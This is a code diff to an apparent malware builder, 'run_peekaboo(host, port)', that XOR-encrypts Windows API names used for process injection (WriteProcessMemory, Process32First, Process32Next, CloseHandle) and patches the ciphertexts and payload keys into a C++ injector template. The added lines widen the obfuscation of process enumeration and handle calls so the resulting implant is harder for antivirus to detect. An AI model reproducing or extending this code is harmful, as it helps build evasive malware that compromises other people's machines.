@@ -91,7 +91,7 @@ def run_peekaboo(host, port):
     f_wpm = "WriteProcessMemory"
     f_clh = "CloseHandle"
     f_p32f = "Process32First"
-    f_ct32s = "CreateToolhelp32Snapshot"
+    f_p32n = "Process32Next"
 
     f_xor = "XOR("
 
@@ -102,6 +102,10 @@ def run_peekaboo(host, port):
     ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
     ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
+    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
+    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
+    ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
+    ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
 
     tmp = open("peekaboo_inj.cpp", "rt")
     data = tmp.read()
@@ -111,6 +115,10 @@ def run_peekaboo(host, port):
     data = data.replace('unsigned char s_cth[] = { };', 'unsigned char s_cth[] = ' + ciphertext_cth)
     data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
     data = data.replace('unsigned char s_wpm[] = { };', 'unsigned char s_wpm[] = ' + ciphertext_wpm)
+    data = data.replace('unsigned char s_op[] = { };', 'unsigned char s_op[] = ' + ciphertext_op)
+    data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
+    data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
+    data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
